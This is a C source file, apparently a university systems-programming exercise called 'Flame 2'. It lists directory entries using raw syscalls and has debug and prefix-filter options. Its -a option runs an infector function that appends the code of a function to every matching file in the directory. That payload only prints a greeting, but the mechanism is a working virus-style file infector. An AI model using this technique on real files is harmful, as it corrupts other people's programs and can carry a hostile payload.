#include "util.h"

#define STDIN 0
#define STDOUT 1
#define ERROR 2
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_LSEEK 19
#define SYS_GETDENTS 141

extern int system_call();

int main(int argc , char* argv[], char* envp[]);

typedef struct ent{
  int inode;
  int offset;
  short len; 
  char buf[1];
}ent;

void printType(ent* e,char* directoryData,int j){
    int d_type = *(directoryData + j + e->len -1);
    switch(d_type){
        case 6: system_call(4,2,"block device",12);
            break;
        case 2: system_call(4,2,"character device",16);
            break;
        case 4: system_call(4,2,"directory",9);
            break;
        case 1: system_call(4,2,"named pipe",10);
            break;
        case 10: system_call(4,2,"symbolic link",13);
            break;
        case 8: system_call(4,2,"regular file",12);
            break;
        case 12: system_call(4,2,"unix domain socket",18);
            break;
        case 0: system_call(4,2,"unknown",7);
            break;
    }
}

void printDebug(int debugMode,int id,int ret,ent* e,int pMode,char* directoryData,int j){
    if(debugMode){
        system_call(SYS_WRITE,ERROR,"\nID = ",6);
        system_call(SYS_WRITE,ERROR,itoa(id),strlen(itoa(id)));
        system_call(SYS_WRITE,ERROR,"\nReturn Code = ",15);
        system_call(SYS_WRITE,ERROR,itoa(ret),strlen(itoa(ret)));
        system_call(SYS_WRITE,ERROR,"\nFile name = ",13);
        system_call(SYS_WRITE,ERROR,e->buf,strlen(e->buf));
        system_call(SYS_WRITE,ERROR,"\nFile length = ",15);
        system_call(SYS_WRITE,ERROR,itoa((int)e->len),sizeof(short));
        system_call(SYS_WRITE,ERROR,"\n",1);
        system_call(SYS_WRITE,ERROR,"File type = ",12);
        printType(e,directoryData,j);
        system_call(SYS_WRITE,ERROR,"\n",1);
    }
}

void infection(){
    system_call(4,1,"Hello, Infected File\n",21);
} 

void infector(char* filename){
    int file = system_call(5,filename,2,0644);
    system_call(19,file,0,2);
    system_call(4,file,&infection,(char*)&main - (char*)&infection);
    system_call(6,file,0,2);
}

int main(int argc , char* argv[], char* envp[]){
    int debugMode = 0;
    int i=0;
    int j=0;
    int pMode=0;
    int aMode=0;
    int ret;
    char* prefix;
    char directoryData[8192];
    int currentDirectory = system_call(5,".",0, 0644);
    int currentDirectorySize = system_call(141,currentDirectory,directoryData,8192);
    ent* e;
    
    for(;i<argc;i++){
        if(!strncmp(argv[i],"-D",2)){
            debugMode = 1;
        }
        if(!strncmp(argv[i],"-p",2)){
            prefix = argv[i]+2;
            pMode=1;
        }
        if(!strncmp(argv[i],"-a",2)){
            prefix = argv[i]+2;
            aMode=1;
        }
    }
    
    ret=system_call(4,1,"Flame 2 strikes!\n",17);
    if(debugMode){
        system_call(4,2,"ID = ",5);
        system_call(4,2,itoa(4),strlen(itoa(4)));
        system_call(4,2,"\nReturn Code = ",15);
        system_call(4,2,itoa(ret),strlen(itoa(ret)));
        system_call(4,2,"\n\n",2);
    }
    while(j<currentDirectorySize){
        e=(ent*)(directoryData+j);
        if(((pMode && !strncmp(e->buf,prefix,strlen(prefix))) || ((aMode && !strncmp(e->buf,prefix,strlen(prefix)))))){
            ret=system_call(4,1,e->buf,strlen(e->buf));
            printDebug(debugMode,4,ret,e,pMode,directoryData,j);
            system_call(SYS_WRITE,ERROR,"\n",1);
        }
        else if(!aMode && !pMode){
            ret=system_call(4,1,e->buf,strlen(e->buf));
            printDebug(debugMode,4,ret,e,pMode,directoryData,j);
            system_call(SYS_WRITE,ERROR,"\n",1);
        }
        if(!pMode && aMode && !strncmp(e->buf,prefix,strlen(prefix))){
            infection();
            infector(e->buf);
        }
        j+=e->len;
    }
    return 0;
}
